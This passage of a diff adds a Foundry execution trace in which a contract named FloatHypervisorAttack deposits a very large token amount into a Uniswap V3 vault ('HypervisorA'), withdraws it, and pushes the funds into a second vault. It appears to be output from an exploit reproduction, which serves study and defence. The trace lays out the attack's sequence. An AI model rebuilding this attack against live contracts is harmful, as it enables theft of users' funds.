+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000053a6eb9e56ae0319d0fd → 0
+    │   │   │   │   │   │   │   │   │   @ 0xd49527dec3a22eb13bb9ca763ef992507c2d23d8da528a16db43ee590e72c2ff: 0 → 0x0000000000000000000000000000000000000000000053a6eb9e56ae0319d0fd
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [426] HypervisorA::token1() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   │   ├─ [3425] WETH9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 0)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 0)
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [80240] HypervisorA::deposit(395035555697366947975421 [3.95e23], 0, 0x3803729416AA5207FE801C1C565B906F6f3f8a28)
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000d247d62e6caf200000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001b772bc722c39268bd934c39cea9bd00000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd69db7bb288
+    │   │   │   │   │   │   │   ├─ [8501] UniV3Pool::burn(-86640 [-8.664e4], -73800 [-7.38e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000bd69db7bb288000000000000000005d62a8fe7c6df28 → 0x00000000000000000000bd8369a5939d000000000000000005d62a8fe7c6df28
+    │   │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d56: 0x00000000000000000000000000000000001b772bc722c39268bd934c39cea9bd → 0x00000000000000000000000000000000001d68f4d6c81bfe209c97ba98170274
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000001a87c203df2c2f000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d120000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd700000000000000000000000000000000000000000000000002115937abba4184000000000000000000000000000000000000000000000000000019090cada3e8
+    │   │   │   │   │   │   │   ├─ [8501] UniV3Pool::burn(-86640 [-8.664e4], -80220 [-8.022e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f35919: 0x0000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd7 → 0x000000000000000000000000000000000002ddb2dfaba886910ac4325278e2e3
+    │   │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x0000000000000000000019090cada3e8000000000000000002115937abba4184 → 0x00000000000000000000191ebd1f7dfb000000000000000002115937abba4184
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000d247d62e6caf200000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001d68f4d6c81bfe209c97ba9817027400000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd8369a5939d
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000001a87c203df2c2f000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d12000000000000000000000000000000000002ddb2dfaba886910ac4325278e2e300000000000000000000000000000000000000000000000002115937abba41840000000000000000000000000000000000000000000000000000191ebd1f7dfb
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 65971014380412205945 [6.597e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 65971014380412205945 [6.597e19]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1852640740575343104 [1.852e18]
+    │   │   │   │   │   │   │   ├─ [6862] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(0x3803729416AA5207FE801C1C565B906F6f3f8a28, HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], 395035555697366947975421 [3.95e23])
+    │   │   │   │   │   │   │   │   ├─ [6110] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(0x3803729416AA5207FE801C1C565B906F6f3f8a28, HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], 395035555697366947975421 [3.95e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, to: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], amount: 395035555697366947975421 [3.95e23])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, spender: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], amount: 115792089237316195423570985008687907853269984665640563640335554892662298074751 [1.157e77])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xc4acc6036fca33b1d1cf4b03d2bfb475e13c8be5a95109648009df80c5e50873: 0x0000000000000000000000000000000000000000000000039388200cb0a7fb79 → 0x0000000000000000000000000000000000000000000053aa7f2676bab3c1cc76
+    │   │   │   │   │   │   │   │   │   │   @ 0xe807a091cafecc4e48f3fb2f6fb6e191cca64e2a0e89c2acdd2062d31834e8e6: 0xffffffffffffffffffffffffffffffffffffffffffffff2278c9fd7faab52f7c → 0xffffffffffffffffffffffffffffffffffffffffffffab7b8d2ba6d1a79b5e7f
+    │   │   │   │   │   │   │   │   │   │   @ 0xd49527dec3a22eb13bb9ca763ef992507c2d23d8da528a16db43ee590e72c2ff: 0x0000000000000000000000000000000000000000000053a6eb9e56ae0319d0fd → 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 4298630215489444490348 [4.298e21])
+    │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, param1: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, param2: 4298630215489444490348 [4.298e21], param3: 395035555697366947975421 [3.95e23], param4: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xb3631c0bf14c6edf120ce61b06277babfe37064155e1ac494d734c021bece83f: 0 → 0x0000000000000000000000000000000000000000000000e9077a5dde6131ac6c
+    │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000001ca697ecf9edf2d8 → 0x0000000000000000000000000000000000000000000000e92420f5cb5b1f9f44
+    │   │   │   │   │   │   │   └─ ← [Return] 4298630215489444490348 [4.298e21]
+    │   │   │   │   │   │   ├─ [23247] HypervisorA::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 4298630215489444490348 [4.298e21])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 4298630215489444490348 [4.298e21])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0 → 0x0000000000000000000000000000000000000000000000e9077a5dde6131ac6c
+    │   │   │   │   │   │   │   │   @ 0xb3631c0bf14c6edf120ce61b06277babfe37064155e1ac494d734c021bece83f: 0x0000000000000000000000000000000000000000000000e9077a5dde6131ac6c → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] 4298630215489444490348 [4.298e21]
+    │   │   │   │   │   ├─ [97872] HypervisorA::withdraw(4298630215489444490348 [4.298e21], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000d247d62e6caf200000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001d68f4d6c81bfe209c97ba9817027400000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd8369a5939d
+    │   │   │   │   │   │   ├─ [15231] UniV3Pool::burn(-86640 [-8.664e4], -73800 [-7.38e4], 3697519836995415 [3.697e15])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount: 3697519836995415 [3.697e15], amount0: 0, amount1: 43750993213990 [4.375e13])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb453: 0x00000000000000000027ac3f66c5f72100000000000000000027ac3f66c5f721 → 0x0000000000000000001a895f7a56d7ca0000000000000000001a895f7a56d7ca
+    │   │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36451: 0xfffffffffffffffffff2db829d19350e0000000000000000000d247d62e6caf2 → 0xfffffffffffffffffffffe628988546500000000000000000000019d7677ab9b
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d54: 0x000000000000000000000000000000000000000000000000000d247d62e6caf2 → 0x0000000000000000000000000000000000000000000000000000019d7677ab9b
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000bd8369a5939d000000000000000005d62a8fe7c6df28 → 0x00000000000000000000e54dfc0e4dc3000000000000000005d62a8fe7c6df28
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027ca9268ba26
+    │   │   │   │   │   │   ├─ [9301] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -86640 [-8.664e4], -73800 [-7.38e4], 0, 43750993213990 [4.375e13])
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 43750993213990 [4.375e13])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 43750993213990 [4.375e13])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000292ead866cca42d08f → 0x0000000000000000000000000000000000000000000000292eadae375cab8ab5
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000e1ee58225e0a864ff → 0x00000000000000000000000000000000000000000000000e1ee55a5b4e3faad9
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -86640 [-8.664e4], tickUpper: -73800 [-7.38e4], amount0: 0, amount1: 43750993213990 [4.375e13])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xfc7802324862bcda5440b24190c8d7cb433a9b6646387db689ed1bf3b9d95d57: 0x00000000000000000000e54dfc0e4dc3000000000000000005d62a8fe7c6df28 → 0x00000000000000000000bd8369a5939d000000000000000005d62a8fe7c6df28
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027ca9268ba26
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000001a87c203df2c2f000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d12000000000000000000000000000000000002ddb2dfaba886910ac4325278e2e300000000000000000000000000000000000000000000000002115937abba41840000000000000000000000000000000000000000000000000000191ebd1f7dfb
+    │   │   │   │   │   │   ├─ [15301] UniV3Pool::burn(-86640 [-8.664e4], -80220 [-8.022e4], 7464031999778216 [7.464e15])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount: 7464031999778216 [7.464e15], amount0: 0, amount1: 37132206876492 [3.713e13])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f35917: 0x000000000000000000000000000000000000000000000000001a87c203df2c2f → 0x00000000000000000000000000000000000000000000000000000342a3eece87
+    │   │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb453: 0x0000000000000000001a895f7a56d7ca0000000000000000001a895f7a56d7ca → 0x0000000000000000000004e01a667a220000000000000000000004e01a667a22
+    │   │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deaf: 0xffffffffffffffffffe5783dfc20d3d10000000000000000001a87c203df2c2f → 0xfffffffffffffffffffffcbd5c113179000000000000000000000342a3eece87
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x00000000000000000000191ebd1f7dfb000000000000000002115937abba4184 → 0x000000000000000000003ae4411fa547000000000000000002115937abba4184
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000021c58400274c
+    │   │   │   │   │   │   ├─ [9301] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -86640 [-8.664e4], -80220 [-8.022e4], 0, 37132206876492 [3.713e13])
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 37132206876492 [3.713e13])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 37132206876492 [3.713e13])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000e1ee55a5b4e3faad9 → 0x00000000000000000000000000000000000000000000000e1ee53895ca3f838d
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000292eadae375cab8ab5 → 0x0000000000000000000000000000000000000000000000292eadcffce0abb201
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount0: 0, amount1: 37132206876492 [3.713e13])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x000000000000000000003ae4411fa547000000000000000002115937abba4184 → 0x00000000000000000000191ebd1f7dfb000000000000000002115937abba4184
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000021c58400274c
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 395101526711747360181366 [3.951e23]
+    │   │   │   │   │   │   │   └─ ← [Return] 395101526711747360181366 [3.951e23]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1852640740575343104 [1.852e18]
+    │   │   │   │   │   │   ├─ [24149] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 394911862263990464219244 [3.949e23])
+    │   │   │   │   │   │   │   ├─ [23403] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 394911862263990464219244 [3.949e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 394911862263990464219244 [3.949e23])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xc4acc6036fca33b1d1cf4b03d2bfb475e13c8be5a95109648009df80c5e50873: 0x0000000000000000000000000000000000000000000053aa7f2676bab3c1cc76 → 0x00000000000000000000000000000000000000000000000a481f7a597e6ac40a
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0 → 0x0000000000000000000000000000000000000000000053a03706fc613557086c
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 1851751399332150429 [1.851e18])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 1851751399332150429 [1.851e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xbe2418a4c7634bc49aeab062e4fa8b7c6e86d01842dd0838fbedcb63e02edc4f: 0x00000000000000000000000000000000000000000000000019b5e6f01668f200 → 0x000000000000000000000000000000000000000000000000000328d9e4e27563
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000292eadcffce0abb201 → 0x00000000000000000000000000000000000000000000002948608e1312322e9e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x0000000000000000000000000000000000000000, amount: 4298630215489444490348 [4.298e21])
+    │   │   │   │   │   │   ├─ emit Withdraw(param0: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 4298630215489444490348 [4.298e21], param3: 394911862263990464219244 [3.949e23], param4: 1851832282532240911 [1.851e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000e92420f5cb5b1f9f44 → 0x0000000000000000000000000000000000000000000000001ca697ecf9edf2d8
+    │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0x0000000000000000000000000000000000000000000000e9077a5dde6131ac6c → 0
+    │   │   │   │   │   │   └─ ← [Return] 394911862263990464219244 [3.949e23], 1851832282532240911 [1.851e18]
+    │   │   │   │   │   ├─ [129924] 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f::deposit(394911862263990464219244 [3.949e23], 0, FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [16991] HypervisorB::getTotalAmounts() [staticcall]
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000008b7621078a2d58b000000000000000000000000000000017ebc0af50f057d2c116191836b92c71700000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025bcbefed74e507
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d000000000000000000000000000000010d14291d583dd108424f02ad02a8beee00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff0000000000000000000000000000000000000000000000007bf7d74d7986f4ce000000000000000000000000000000000000000000000000000722ee628bb66e
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 251221521315133399004 [2.512e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 251221521315133399004 [2.512e20]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 2769880751388380194 [2.769e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 671788037876398744909 [6.717e20], 3019628980824500897 [3.019e18]
+    │   │   │   │   │   │   ├─ [389] HypervisorB::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 25822437733451680325 [2.582e19]
+    │   │   │   │   │   │   ├─ [428] HypervisorB::token0() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9
+    │   │   │   │   │   │   ├─ [26762] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 394911862263990464219244 [3.949e23])
